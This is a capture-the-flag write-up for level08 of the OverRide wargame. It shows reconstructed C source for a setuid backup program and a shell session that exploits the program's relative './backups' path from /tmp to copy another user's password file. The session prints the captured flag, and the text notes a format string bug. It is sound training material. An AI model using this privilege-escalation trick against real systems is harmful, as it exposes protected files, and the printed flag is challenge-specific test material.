# level08

## Reconstructed C source code from assembly

```c
#include <stdio.h>
#include <string.h>

static void log_wrapper(FILE *a1, const char *prefix, const char *filename)
{
    char dest[264];

    strcpy(dest, prefix);
    snprintf(&dest[strlen(dest)], 254 - strlen(dest), filename);
    dest[strcspn(dest, "\n")] = 0;
    fprintf(a1, "LOG: %s\n", dest);
}

int main(int argc, const char **argv, const char **envp)
{
    FILE *logfp;
    FILE *stream;
    int fd;
    char buf;
    char dest[104];

    buf = -1;
    if (argc != 2)
        printf("Usage: %s filename\n", *argv);
    logfp = fopen("./backups/.log", "w");
    if (!logfp)
    {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }
    log_wrapper(logfp, "Starting back up: ", argv[1]);
    stream = fopen(argv[1], "r");
    if (!stream)
    {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }
    strcpy(dest, "./backups/");
    strncat(dest, argv[1], 99 - strlen(dest));
    fd = open(dest, 193, 432LL);
    if (fd < 0)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }
    while (1)
    {
        buf = fgetc(stream);
        if (buf == -1)
            break;
        write(fd, &buf, 1uLL);
    }
    log_wrapper(logfp, "Finished back up ", argv[1]);
    fclose(stream);
    close(fd);
    return 0;
}
```

## Exploit

This program makes a backup of any given file, in a folder called `backups`, in the same working directory. For example, if we want to make a backup of `/bin/ls`, the backup will be stored at `./backups/bin/ls`. First idea was to make a backup of the `.passwd` flag, but the program needs the directory to be created in the `backups` folder beforehand, and we do not have any permission to write in our home directory.
Even is this binary as a format string vulnerability in the the `log_wrapper` function, this one does not allow us to redirect control flow.

The thing is that the program uses **relative** path instead of **absolute** path. We can execute this program under the `/tmp`, a directory where we have permission to write :

```
level08@OverRide:/tmp$ ls -la $HOME
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
level08@OverRide:/tmp$ mkdir -p /tmp/backups/home/users/level08/
level08@OverRide:/tmp$ $HOME/level08 $HOME/.pass 
level08@OverRide:/tmp$ cat backups/
home/ .log  
level08@OverRide:/tmp$ cat backups/home/users/level08/.pass 
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
level08@OverRide:/tmp$
```

This is **that** easy !